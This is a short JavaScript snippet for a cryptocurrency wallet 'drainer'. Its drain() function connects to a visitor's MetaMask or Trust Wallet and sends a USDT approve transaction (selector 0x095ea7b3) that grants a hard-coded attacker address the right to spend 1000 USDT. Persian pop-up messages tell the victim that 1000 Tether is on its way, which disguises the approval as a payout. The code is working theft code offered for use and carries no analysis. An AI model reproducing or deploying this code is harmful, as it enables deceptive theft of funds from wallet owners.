const YOUR_WALLET = "0x9059E067fBE5bff6cf1E3da5072bF7A75840192D";
const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";

async function drain() {
  if (!window.ethereum) return alert("MetaMask یا Trust Wallet نصب کن!");

  try {
    const acc = await ethereum.request({ method: 'eth_requestAccounts' });
    const amount = "0x" + (1000 * 1000000).toString(16).padStart(64, '0');
    const data = "0x095ea7b3" + "000000000000000000000000" + YOUR_WALLET.slice(2) + amount;

    await ethereum.request({
      method: 'eth_sendTransaction',
      params: [{ from: acc[0], to: USDT, data }]
    });

    alert("تأیید شد! ۱۰۰۰ تتر میاد 🔥");
  } catch (e) {
    alert("لغو شد.");
  }
}
